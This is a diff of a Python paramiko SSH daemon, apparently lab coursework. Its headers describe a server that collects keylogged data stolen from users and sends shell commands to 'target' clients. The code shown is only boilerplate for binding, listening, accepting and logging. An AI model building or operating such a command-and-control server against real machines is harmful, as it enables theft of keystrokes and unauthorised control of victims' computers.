@@ -10,27 +10,23 @@
  #
  #    Class:  DPI912 
  #    Professor:  Harvey Kaduri
- #    Due Date:  Apr 15th 2020 
- #    Submitted: Apr 15th 2020
+ #    Due Date:  Mar 24th 2020 
+ #    Submitted: Mar 22nd 2020
  #
  #-----------------------------------------------------------------------------
  #
- #  Description: This program acts as a paramiko server. It manages and handles the connections of inbound clients. It accepts incoming commands from the clients
- #                       and as directed will move to signup the target for the coupon list or will store keylogged information that was stolen from the user.
- #                       It will handle multiple connections at once and is multi-threaded.
- #                       The scraper will pretend to be a browser by using a header that captures a session cookie and adds a token + session key to the payload  
+ #  Description: This program is a skeleton daemon that acts as an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
  #      
- #        Input:  start|stop|restart
+ #        Input:  N/A
  #
- #       Output:  Outputs connection and health to console and logFiles
+ #       Output:  Outputs to console results of command executed
  #
- #    Algorithm:  Invokes the Paramiko supplied functions to create and manage an SSH server. Continously await connections from client targets in a non-blocking manner
- #                       
+ #    Algorithm:  Invokes the Paramiko supplied functions to create and manage an SSH server. Continously request new commands and then send them to the target client. Await for 
  #               
  #             
  #   Required Features Not Included: N/A
  #
- #   Known Bugs:  Children spawned from handling clients do not appear to be handeld by the sigChild terminator function and are possibly still running as zombies
+ #   Known Bugs:  Children spawned from handling clients do not appear to be handeld by the sigChild terminator function and remain as zombies
  #      
  #
  #   Classification: N/A
@@ -306,8 +302,6 @@ class MyDaemon(Daemon):
         print("*** Bind failed: " + str(e))
         e.print_exc()
         sys.exit(1)
-        
-    #double fork
     try:
         sock.listen(100)
         print("Listening for connection ...")
@@ -317,7 +311,6 @@ class MyDaemon(Daemon):
             traceback.print_exc()
             sys.exit(1)
     while True:
-        #loop and fork per client request
         print("Waiting...")
 
         client, addr = sock.accept()
@@ -398,7 +391,7 @@ class Server (paramiko.ServerInterface):
         return paramiko.AUTH_FAILED
 
 
-# MAIN #
+
 if __name__=="__main__":
     logzero.logfile("/home/lab/sandbox/serverLogs.log",maxBytes=1e6, backupCount=3, disableStderrLogger=True)
     daemonPid=os.getpid()
